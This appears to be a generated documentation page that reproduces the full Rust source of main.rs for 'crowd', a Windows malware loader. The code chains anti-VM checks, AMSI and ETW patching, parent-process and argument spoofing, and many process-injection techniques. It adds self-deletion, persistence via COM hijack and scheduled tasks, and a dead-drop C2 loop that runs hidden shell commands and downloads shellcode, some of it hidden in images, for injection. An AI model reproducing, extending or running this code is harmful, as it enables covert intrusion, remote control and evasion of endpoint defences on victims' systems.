# crowd — main.rs  (v6 — Cadena completa 6 fases + Tsukuyomi Tier A)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/main.rs` |
| **Lines** | 604 |
| **Cards** | T023-client-capabilities |
| **Role** | Entry point, FSM bootstrap |
| **Unsafe blocks** | 3 |
| **Feature gates** | megadebug |

## Purpose

# crowd — main.rs  (v6 — Cadena completa 6 fases + Tsukuyomi Tier A)

## Protocolo de ejecución (orden exacto del spec):

```text
FASE 1: Anti-VM → Hammering → AMSI-HBP → Block-DLL → WinHTTP-DL → AES-GCM+zstd
CASCADE: FreshyCalls → KnownDlls → RecycledGate → Exception-SSN → Phantom Stubs
FASE 3: ETW-Muffle → PPID-Spoof → NtCreateUserProcess → Arg-Spoof → Mod-Overload
FASE 4: Mapping-Inject → Stack-Spoof → Threadless → Pool Party → WaitingThread
ALT: EarlyBird | Hypnosis | DirtyVanity | Herpaderping | ModuleStomp | ProxyDll
PRE: KiStepOver (HW breakpoint EDR bypass, chains into default FASE 4)
FASE 5: SecureZero → Self-Delete → BlockHandle-SDDL → Ekko → PEB-Unlink
FASE 6: COM-Hijack → NTFS-EA → SchedTask → TLS-CB → Resilience-Monitor
```

## Internal Functions

- `main` (line 70)
- `parse_and_run` (line 92)
- `hex_decode` (line 385)
- `run_dead_drop_loop` (line 398)
- `exec_shell_command` — Execute a shell command via CreateProcessW (cmd.exe /C ...). (line 458)
- `inject_from_url` — Download payload from URL + inject using the current technique stack. (line 491)
- `stego_inject` — Download image, extract LSB payload, inject. (line 508)
- `download_and_inject` — Download raw payload + inject. (line 522)
- `clone_cfg_for_inject` — Clone the base ChainConfig for a new injection (payload_path cleared). (line 536)
- `override_injection_method` — Map string injection method names to InjectionMethod variants. (line 583)

## Key Dependencies

- `use chain::ChainConfig;`
- `use edo_dead_drop::EdoCommand;`
- `use winapi::um::processthreadsapi::{CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW};`
- `use winapi::um::winbase::CREATE_NO_WINDOW;`

## Full Source

```rust
//! # crowd — main.rs  (v6 — Cadena completa 6 fases + Tsukuyomi Tier A)
//!
//! ## Protocolo de ejecución (orden exacto del spec):
//!
//! ```text
//! FASE 1: Anti-VM → Hammering → AMSI-HBP → Block-DLL → WinHTTP-DL → AES-GCM+zstd
//! CASCADE: FreshyCalls → KnownDlls → RecycledGate → Exception-SSN → Phantom Stubs
//! FASE 3: ETW-Muffle → PPID-Spoof → NtCreateUserProcess → Arg-Spoof → Mod-Overload
//! FASE 4: Mapping-Inject → Stack-Spoof → Threadless → Pool Party → WaitingThread
//!     ALT: EarlyBird | Hypnosis | DirtyVanity | Herpaderping | ModuleStomp | ProxyDll
//!     PRE: KiStepOver (HW breakpoint EDR bypass, chains into default FASE 4)
//! FASE 5: SecureZero → Self-Delete → BlockHandle-SDDL → Ekko → PEB-Unlink
//! FASE 6: COM-Hijack → NTFS-EA → SchedTask → TLS-CB → Resilience-Monitor
//! ```

// En builds normales: subsistema Windows (sin consola).
// En megadebug: el debug_log::init() abre una consola explícitamente.
#![cfg_attr(not(feature = "megadebug"), windows_subsystem = "windows")]
#![allow(non_snake_case)]

mod amsi_hbp;
mod amsi_page_guard;
mod anti_vm;
mod arg_spoof;
mod block_handle;
mod byovd;
mod chain;
mod crypto;
mod debug_log; // ← Mega-debug logger (no-op en builds normales)
mod dirty_vanity;
mod edo_tensei;
mod early_bird;
mod early_cascade;
mod etw;
mod fsm;
mod func_stomp;
mod ghost;
mod hammering;
mod hells_gate;
mod herpaderping;
mod hypnosis;
mod iat_camo;              // [A:8.0] IAT Camouflage
mod ki_step_over;
mod mapping_inject;
mod module_stomp;
mod nt_create_process;     // [A:8.0] NtCreateUserProcess
mod overload;
mod payload_cfg;
mod pe_loader;             // [A:8.5] Reflective PE Loader
mod peb_unlink;
mod persist;
mod phantom;
mod pool_party;
mod policy;
mod ppid;
mod proxy_dll;
mod recycled;
mod resolve;
mod self_delete;
mod sleep;
mod stack_spoof;
mod stomp;
mod syscall_map;
mod threadless;
mod veh_gate;              // [A:8.0] VEH Syscall Exceptions
mod waiting_thread;        // [A:8.0] WaitingThread Hijacking
mod winhttp_dl;
mod edo_dead_drop;         // Autonomous dead drop C2 (GT+Rentry / Blockchain / LSB Stego)

fn main() {
    let args: Vec<String> = std::env::args().collect();

    // Inicializar mega-debug si el flag está presente
    // (funciona incluso antes del parse de ChainConfig)
    #[cfg(feature = "megadebug")]
    if args.iter().any(|a| a == "--mega-debug") {
        debug_log::init();
        mega_dbg!("main() arrancando con {} args", args.len());
    }

    match parse_and_run(&args) {
        Ok(()) => {}
        Err(e) => {
            #[cfg(feature = "megadebug")]
            eprintln!("[!] FATAL: {:?}", e);
            let _ = e;
            std::process::exit(1);
        }
    }
}

fn parse_and_run(args: &[String]) -> anyhow::Result<()> {
    use chain::ChainConfig;

    // Payload embebido en compile-time (crowd_builder.py)
    if !payload_cfg::PAYLOAD.is_empty() {
        let mut cfg = ChainConfig::default();
        cfg.aes_key.copy_from_slice(&payload_cfg::KEY);
        cfg.sleep_ms    = if payload_cfg::SLEEP_MS > 0 { payload_cfg::SLEEP_MS } else { cfg.sleep_ms };
        cfg.ppid_parent = if payload_cfg::PPID_AUTO { Some(0) } else { cfg.ppid_parent };
        if !payload_cfg::OVERLOAD_DLL.is_empty() {
            cfg.overload_target_dll = Some(payload_cfg::OVERLOAD_DLL.to_string());
        }
        if !payload_cfg::STOMP_DLL.is_empty() {
            cfg.stomp_dll    = payload_cfg::STOMP_DLL.to_string();
            cfg.stomp_export = payload_cfg::STOMP_EXPORT.to_string();
        }

        // Wire INJECTION_TARGET_EXE from payload_cfg (Tier A techniques)
        if !payload_cfg::INJECTION_TARGET_EXE.is_empty() {
            cfg.injection_target_exe = payload_cfg::INJECTION_TARGET_EXE.to_string();
        }

        // ── Wire ALL evasion toggles from payload_cfg ────────────────────
        // These were previously hardcoded to ChainConfig::default() (all true),
        // ignoring the builder UI settings. Now they reflect the operator's choices.
        cfg.anti_vm         = payload_cfg::ANTI_VM;
        cfg.hammer_seed     = if payload_cfg::HAMMER_ENABLED { payload_cfg::HAMMER_SEED } else { 0 };
        cfg.hammer_iters    = payload_cfg::HAMMER_ITERS;
        cfg.hammer_min_secs = payload_cfg::HAMMER_SECS;
        cfg.patch_etw       = payload_cfg::ETW_PATCH;
        cfg.self_delete     = payload_cfg::SELF_DELETE;
        cfg.stomp_own_header = payload_cfg::STOMP_HEADER;
        cfg.peb_unlink      = payload_cfg::PEB_UNLINK;
        cfg.block_handle    = payload_cfg::BLOCK_HANDLE;
        cfg.use_threadless  = payload_cfg::USE_THREADLESS;

        // Wire Argument Spoofing
        if !payload_cfg::DECOY_ARGS.is_empty() {
            cfg.decoy_args = payload_cfg::DECOY_ARGS.to_string();
        }
        if !payload_cfg::REAL_ARGS.is_empty() {
            cfg.real_args = payload_cfg::REAL_ARGS.to_string();
        }

        // ── Wire Phase 1+2 new technique toggles from payload_cfg ────
        cfg.byovd_enabled     = payload_cfg::BYOVD_ENABLED;
        cfg.veh_syscalls      = payload_cfg::VEH_SYSCALLS;
        cfg.iat_camo_profile  = payload_cfg::IAT_CAMO_PROFILE;
        cfg.amsi_page_guard   = payload_cfg::AMSI_PAGE_GUARD;
        cfg.hells_gate        = payload_cfg::HELLS_GATE;
        cfg.mapping_inject    = payload_cfg::MAPPING_INJECT;
        cfg.early_cascade     = payload_cfg::EARLY_CASCADE;
        cfg.waiting_thread    = payload_cfg::WAITING_THREAD;
        cfg.nt_create_process = payload_cfg::NT_CREATE_PROCESS;
        cfg.reflective_pe     = payload_cfg::REFLECTIVE_PE;

        // Note: BLOCK_DLL is applied at process creation time by chain.rs
        // via policy::apply_block_dll_policy(). The constant is read there.

        // Wire INJECTION_TYPE — override Rust's runtime re-detection
        match payload_cfg::INJECTION_TYPE {
            "process_ghost" => {
                cfg.overload_target_dll = None;
            }
            "module_overload" => {
                // OVERLOAD_DLL already wired above; keep as-is
            }
            "function_stomp" => {
                // STOMP_DLL/EXPORT already wired above; ensure no overload dll
                cfg.overload_target_dll = None;
            }
            "thread_hijack" => {
                cfg.overload_target_dll = None;
                if payload_cfg::HIJACK_PID > 0 {
                    cfg.target_pid = Some(payload_cfg::HIJACK_PID);
                }
            }
            // Tsukuyomi Tier A techniques
            "early_bird"      => { cfg.injection_method = chain::InjectionMethod::EarlyBird; }
            "early_bird_ppid" => { cfg.injection_method = chain::InjectionMethod::EarlyBirdPpid; }
            "hypnosis"        => { cfg.injection_method = chain::InjectionMethod::Hypnosis; }
            "dirty_vanity"    => { cfg.injection_method = chain::InjectionMethod::DirtyVanity; }
            "herpaderping"    => { cfg.injection_method = chain::InjectionMethod::Herpaderping; }
            "module_stomp"    => { cfg.injection_method = chain::InjectionMethod::ModuleStomp; }
            "proxy_dll"       => { cfg.injection_method = chain::InjectionMethod::ProxyDll; }
            "ki_step_over"    => { cfg.injection_method = chain::InjectionMethod::KiStepOver; }
            _ => {
                // "auto": let runtime detection decide (existing behavior)
            }
        }

        // Wire PERSIST_ENABLED + PERSIST_METHODS — activate Fase 6 in embedded mode
        if payload_cfg::PERSIST_ENABLED {
            cfg.persist = true;
            if !payload_cfg::PERSIST_METHODS.is_empty() {
                let methods: Vec<String> = payload_cfg::PERSIST_METHODS
                    .split(',')
                    .map(|s| s.trim().to_string())
                    .filter(|s| !s.is_empty())
                    .collect();
                cfg.persist_cfg
                    .get_or_insert_with(crate::persist::PersistConfig::default)
                    .methods = methods;
            }
        }

        // ── Edo Tensei: override cfg with current generation's technique stack ──
        if edo_tensei::is_active() {
            #[cfg(feature = "megadebug")]
            crate::mega_dbg!("EdoTensei: resurrection engine active, applying generation overrides");
            let _gen = edo_tensei::apply_resurrection(&mut cfg);
            #[cfg(feature = "megadebug")]
            crate::mega_dbg!("EdoTensei: applied generation {}", _gen);
        }

        // Execute embedded payload first (if present)
        let has_embedded = !payload_cfg::PAYLOAD.is_empty();
        if has_embedded {
            let mut embedded = payload_cfg::PAYLOAD.to_vec();
            let plaintext = if cfg.aes_key.iter().any(|&b| b != 0) {
                crypto::decrypt_and_decompress(&embedded, &cfg.aes_key, 0)
                    .map_err(|e| anyhow::anyhow!("embedded decrypt: {}", e))?
            } else {
                embedded.clone()
            };
            crypto::secure_zero_memory(&mut embedded);
            chain::run_with_shellcode(
                clone_cfg_for_inject(&cfg), plaintext
            ).map_err(|_| {
                anyhow::anyhow!("embedded payload execution failed")
            })?;
        }

        // ── Edo Dead Drop: autonomous C2 polling loop ────────────────────
        // After embedded payload (if any), enter the dead drop beacon loop.
        // crowd becomes a persistent agent: polling channels for commands,
        // injecting payloads delivered via INJECT/STEGO/DOWNLOAD, executing
        // shell commands, etc. This makes crowd fully autonomous.
        if edo_dead_drop::is_enabled() {
            #[cfg(feature = "megadebug")]
            crate::mega_dbg!("EdoDeadDrop: autonomous polling enabled");
            run_dead_drop_loop(&cfg);
            // run_dead_drop_loop is infinite — never returns
        }

        if !has_embedded {
            // No payload and no dead drop — nothing to do
            return Ok(());
        }
        return Ok(());
    }

    if args.len() < 2 || args.iter().any(|a| a == "--help" || a == "-h") {
        // Sin consola — return silencioso
        return Ok(());
    }

    let mut cfg = ChainConfig::default();
    let mut i = 1usize;

    while i < args.len() {
        match args[i].as_str() {

            // ── Payload / Descarga ────────────────────────────────────────────
            "--payload"         => { i += 1; cfg.payload_path = args[i].clone(); }
            "--key"             => {
                i += 1;
                let b = hex_decode(&args[i]).map_err(|e| anyhow::anyhow!("--key: {}", e))?;
                if b.len() != 32 { return Err(anyhow::anyhow!("--key: necesita 32 bytes (64 hex)")); }
                cfg.aes_key.copy_from_slice(&b);
            }
            "--c2-host"         => { i += 1; cfg.c2_host = args[i].clone(); }
            "--c2-path"         => { i += 1; cfg.c2_path = args[i].clone(); }
            "--c2-port"         => {
                i += 1;
                cfg.c2_port = args[i].parse::<u16>()
                    .map_err(|_| anyhow::anyhow!("--c2-port: inválido"))?;
            }
            "--decompress-mb"   => {
                i += 1;
                cfg.decompress_out_mb = args[i].parse::<usize>()
                    .map_err(|_| anyhow::anyhow!("--decompress-mb: inválido"))?;
            }

            // ── Anti-Sandbox ──────────────────────────────────────────────────
            "--no-anti-vm"      => { cfg.anti_vm = false; }
            "--no-hammer"       => { cfg.hammer_seed = 0; }
            "--hammer-seed"     => {
                i += 1;
                cfg.hammer_seed = u32::from_str_radix(args[i].trim_start_matches("0x"), 16)
                    .or_else(|_| args[i].parse::<u32>())
                    .map_err(|_| anyhow::anyhow!("--hammer-seed: inválido"))?;
            }
            "--hammer-iters"    => {
                i += 1;
                cfg.hammer_iters = args[i].parse::<u32>()
                    .map_err(|_| anyhow::anyhow!("--hammer-iters: inválido (número de iteraciones)"))?;
            }
            "--hammer-secs"     => {
                i += 1;
                cfg.hammer_min_secs = args[i].parse::<u64>()
                    .map_err(|_| anyhow::anyhow!("--hammer-secs: inválido (segundos mínimos)"))?;
            }

            // ── ETW ───────────────────────────────────────────────────────────
            "--no-etw"          => { cfg.patch_etw = false; }

            // ── PPID / Proceso ────────────────────────────────────────────────
            "--ppid"            => {
                i += 1;
                cfg.ppid_parent = Some(
                    args[i].parse::<u32>().map_err(|_| anyhow::anyhow!("--ppid: PID inválido"))?
                );
            }
            "--ppid-auto"       => { cfg.ppid_parent = Some(0); }
            "--decoy-args"      => { i += 1; cfg.decoy_args = args[i].clone(); }
            "--real-args"       => { i += 1; cfg.real_args  = args[i].clone(); }

            // ── Injection ─────────────────────────────────────────────────────
            "--target-pid"      => {
                i += 1;
                cfg.target_pid = Some(
                    args[i].parse::<u32>().map_err(|_| anyhow::anyhow!("--target-pid: PID inválido"))?
                );
            }
            "--overload-dll"    => { i += 1; cfg.overload_target_dll = Some(args[i].clone()); }
            "--no-overload"     => { cfg.overload_target_dll = None; }
            "--stomp-dll"       => { i += 1; cfg.stomp_dll    = args[i].clone(); }
            "--stomp-export"    => { i += 1; cfg.stomp_export  = args[i].clone(); }
            "--threadless"      => { cfg.use_threadless = true; }
            "--no-threadless"   => { cfg.use_threadless = false; }

            // ── Tsukuyomi Tier A Injection Techniques ────────────────────
            "--early-bird"      => { cfg.injection_method = chain::InjectionMethod::EarlyBird; }
            "--early-bird-ppid" => { cfg.injection_method = chain::InjectionMethod::EarlyBirdPpid; }
            "--hypnosis"        => { cfg.injection_method = chain::InjectionMethod::Hypnosis; }
            "--dirty-vanity"    => { cfg.injection_method = chain::InjectionMethod::DirtyVanity; }
            "--herpaderp"       => { cfg.injection_method = chain::InjectionMethod::Herpaderping; }
            "--module-stomp"    => { cfg.injection_method = chain::InjectionMethod::ModuleStomp; }
            "--proxy-dll"       => { cfg.injection_method = chain::InjectionMethod::ProxyDll; }
            "--ki-step-over"    => { cfg.injection_method = chain::InjectionMethod::KiStepOver; }
            "--inject-target-exe" => { i += 1; cfg.injection_target_exe = args[i].clone(); }

            // ── Sleep ─────────────────────────────────────────────────────────
            "--sleep"           => {
                i += 1;
                cfg.sleep_ms = args[i].parse::<u64>()
                    .map_err(|_| anyhow::anyhow!("--sleep: ms inválidos"))?;
            }

            // ── Cleanup ───────────────────────────────────────────────────────
            "--no-self-delete"  => { cfg.self_delete      = false; }
            "--no-header-stomp" => { cfg.stomp_own_header = false; }
            "--no-block-handle" => { cfg.block_handle     = false; }
            "--no-peb-unlink"   => { cfg.peb_unlink       = false; }

            // ── Persistencia ──────────────────────────────────────────────────
            "--persist"         => { cfg.persist = true; }
            "--persist-clsid"   => {
                i += 1;
                cfg.persist_cfg.get_or_insert_with(Default::default).com_clsid = args[i].clone();
            }
            "--persist-tls-dll" => {
                i += 1;
                cfg.persist_cfg.get_or_insert_with(Default::default).tls_target_dll = Some(args[i].clone());
            }
            "--persist-c2"      => {
                i += 1;
                cfg.persist_cfg.get_or_insert_with(Default::default).c2_url = args[i].clone();
            }
            "--persist-task"    => {
                i += 1;
                cfg.persist_cfg.get_or_insert_with(Default::default).task_name = Some(args[i].clone());
            }

            // Ignorar --mega-debug (ya fue procesado en main())
            "--mega-debug"     => { /* no-op en parse_and_run */ }

            other => return Err(anyhow::anyhow!("argumento desconocido: {}", other)),
        }
        i += 1;
    }

    if cfg.payload_path.is_empty() && cfg.c2_host.is_empty() {
        return Err(anyhow::anyhow!("Especifica --payload <path> o --c2-host <host>"));
    }

    let mut dispatcher = fsm::FsmDispatcher::new(cfg);
    dispatcher.run();

    Ok(())
}

fn hex_decode(s: &str) -> Result<Vec<u8>, String> {
    let s = s.trim_start_matches("0x");
    if s.len() % 2 != 0 {
        return Err(format!("longitud hex impar: {}", s.len()));
    }
    (0..s.len() / 2)
        .map(|i| u8::from_str_radix(&s[i * 2..i * 2 + 2], 16)
            .map_err(|_| format!("hex inválido en posición {}", i * 2)))
        .collect()
}

// ── Edo Dead Drop: Polling Loop + Command Execution ────────────────────────

fn run_dead_drop_loop(base_cfg: &chain::ChainConfig) {
    use edo_dead_drop::EdoCommand;

    loop {
        match edo_dead_drop::poll_once() {
            Some(commands) => {
                for cmd in commands {
                    #[cfg(feature = "megadebug")]
                    mega_dbg!("EdoDeadDrop: executing {:?}", cmd);
                    match cmd {
                        EdoCommand::Exec { cmd: shell_cmd } => {
                            exec_shell_command(&shell_cmd);
                        }
                        EdoCommand::Inject { url, method } => {
                            inject_from_url(base_cfg, &url, method.as_deref());
                        }
                        EdoCommand::StegoLoad { url } => {
                            stego_inject(base_cfg, &url);
                        }
                        EdoCommand::Download { url } => {
                            download_and_inject(base_cfg, &url);
                        }
                        EdoCommand::Sleep { ms } => {
                            // Use Ekko sleep for evasion (encrypts memory while sleeping)
                            #[cfg(feature = "megadebug")]
                            mega_dbg!("EdoDeadDrop: sleeping {}ms via Ekko", ms);
                            sleep::ekko_sleep_dynamic(ms);
                        }
                        EdoCommand::Config { key, value } => {
                            #[cfg(feature = "megadebug")]
                            mega_dbg!("EdoDeadDrop: config {}={} (runtime reconfig not yet implemented)", key, value);
                            let _ = (key, value);
                        }
                        EdoCommand::Kill => {
                            #[cfg(feature = "megadebug")]
                            mega_dbg!("EdoDeadDrop: KILL received — self-destructing");
                            let _ = self_delete::delete_self();
                            std::process::exit(0);
                        }
                        EdoCommand::Ping => {
                            #[cfg(feature = "megadebug")]
                            mega_dbg!("EdoDeadDrop: PING acknowledged");
                        }
                    }
                }
            }
            None => {
                #[cfg(feature = "megadebug")]
                mega_dbg!("EdoDeadDrop: no commands from any channel");
            }
        }

        let interval = edo_dead_drop::jittered_interval();
        #[cfg(feature = "megadebug")]
        mega_dbg!("EdoDeadDrop: next poll in {}ms", interval);
        sleep::ekko_sleep_dynamic(interval);
    }
}

/// Execute a shell command via CreateProcessW (cmd.exe /C ...).
fn exec_shell_command(cmd: &str) {
    use winapi::um::processthreadsapi::{CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW};
    use winapi::um::winbase::CREATE_NO_WINDOW;
    use std::ptr::null_mut;
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;

    let cmdline = format!("cmd.exe /C {}", cmd);
    let mut cmdline_w: Vec<u16> = OsStr::new(&cmdline).encode_wide().chain(Some(0)).collect();

    let mut si: STARTUPINFOW = unsafe { std::mem::zeroed() };
    si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    unsafe {
        let ok = CreateProcessW(
            null_mut(),
            cmdline_w.as_mut_ptr(),
            null_mut(), null_mut(),
            0, // bInheritHandles
            CREATE_NO_WINDOW,
            null_mut(), null_mut(),
            &mut si, &mut pi,
        );
        if ok != 0 {
            winapi::um::synchapi::WaitForSingleObject(pi.hProcess, 30000);
            winapi::um::handleapi::CloseHandle(pi.hProcess);
            winapi::um::handleapi::CloseHandle(pi.hThread);
        }
    }
}

/// Download payload from URL + inject using the current technique stack.
fn inject_from_url(base_cfg: &chain::ChainConfig, url: &str, method: Option<&str>) {
    match edo_dead_drop::download_raw(url) {
        Ok(shellcode) => {
            let mut cfg = clone_cfg_for_inject(base_cfg);
            if let Some(m) = method {
                override_injection_method(&mut cfg, m);
            }
            let _ = chain::run_with_shellcode(cfg, shellcode);
        }
        Err(_e) => {
            #[cfg(feature = "megadebug")]
            mega_dbg!("EdoDeadDrop: inject download failed: {}", _e);
        }
    }
}

/// Download image, extract LSB payload, inject.
fn stego_inject(base_cfg: &chain::ChainConfig, url: &str) {
    match edo_dead_drop::stego_extract(url) {
        Ok(shellcode) => {
            let cfg = clone_cfg_for_inject(base_cfg);
            let _ = chain::run_with_shellcode(cfg, shellcode);
        }
        Err(_e) => {
            #[cfg(feature = "megadebug")]
            mega_dbg!("EdoDeadDrop: stego extract failed: {}", _e);
        }
    }
}

/// Download raw payload + inject.
fn download_and_inject(base_cfg: &chain::ChainConfig, url: &str) {
    match edo_dead_drop::download_raw(url) {
        Ok(shellcode) => {
            let cfg = clone_cfg_for_inject(base_cfg);
            let _ = chain::run_with_shellcode(cfg, shellcode);
        }
        Err(_e) => {
            #[cfg(feature = "megadebug")]
            mega_dbg!("EdoDeadDrop: download failed: {}", _e);
        }
    }
}

/// Clone the base ChainConfig for a new injection (payload_path cleared).
fn clone_cfg_for_inject(base: &chain::ChainConfig) -> chain::ChainConfig {
    chain::ChainConfig {
        anti_vm:         false, // already past sandbox checks
        hammer_seed:     0,     // no re-hammering
        hammer_iters:    0,
        hammer_min_secs: 0,
        payload_path:    String::new(),
        c2_host:         String::new(),
        c2_path:         String::new(),
        c2_port:         0,
        chunk_hashes:    Vec::new(),
        aes_key:         [0u8; 32], // payload already decrypted
        decompress_out_mb: base.decompress_out_mb,
        patch_etw:       base.patch_etw,
        ppid_parent:     base.ppid_parent,
        decoy_args:      base.decoy_args.clone(),
        real_args:       base.real_args.clone(),
        overload_target_dll: base.overload_target_dll.clone(),
        target_pid:      base.target_pid,
        use_threadless:  base.use_threadless,
        stomp_dll:       base.stomp_dll.clone(),
        stomp_export:    base.stomp_export.clone(),
        injection_method: base.injection_method.clone(),
        injection_target_exe: base.injection_target_exe.clone(),
        herpaderp_decoy: None,
        sleep_ms:        base.sleep_ms,
        self_delete:     false, // don't delete crowd after dead drop inject
        stomp_own_header: base.stomp_own_header,
        block_handle:    base.block_handle,
        peb_unlink:      base.peb_unlink,
        persist:         false, // persistence already handled by crowd itself
        persist_cfg:     None,
        byovd_enabled:   base.byovd_enabled,
        byovd_driver:    Vec::new(),
        veh_syscalls:    base.veh_syscalls,
        iat_camo_profile: base.iat_camo_profile,
        amsi_page_guard: base.amsi_page_guard,
        hells_gate:      base.hells_gate,
        mapping_inject:  base.mapping_inject,
        early_cascade:   base.early_cascade,
        waiting_thread:  base.waiting_thread,
        nt_create_process: base.nt_create_process,
        reflective_pe:   base.reflective_pe,
    }
}

/// Map string injection method names to InjectionMethod variants.
fn override_injection_method(cfg: &mut chain::ChainConfig, method: &str) {
    cfg.injection_method = match method.to_lowercase().as_str() {
        "early_bird"      => chain::InjectionMethod::EarlyBird,
        "early_bird_ppid" => chain::InjectionMethod::EarlyBirdPpid,
        "hypnosis"        => chain::InjectionMethod::Hypnosis,
        "dirty_vanity"    => chain::InjectionMethod::DirtyVanity,
        "herpaderping"    => chain::InjectionMethod::Herpaderping,
        "module_stomp"    => chain::InjectionMethod::ModuleStomp,
        "proxy_dll"       => chain::InjectionMethod::ProxyDll,
        "ki_step_over"    => chain::InjectionMethod::KiStepOver,
        "early_cascade"   => chain::InjectionMethod::EarlyCascade,
        "mapping_inject"  => chain::InjectionMethod::MappingInject,
        "waiting_thread"  => chain::InjectionMethod::WaitingThreadHijack,
        "nt_create"       => chain::InjectionMethod::NtCreateProcess,
        "reflective_pe"   => chain::InjectionMethod::ReflectivePe,
        "pool_party"      => chain::InjectionMethod::PoolParty,
        "overload"        => chain::InjectionMethod::Overload,
        "phantom" | "ghost" => chain::InjectionMethod::Phantom,
        "threadless"      => { cfg.use_threadless = true; chain::InjectionMethod::Auto },
        _                 => chain::InjectionMethod::Auto,
    };
}

```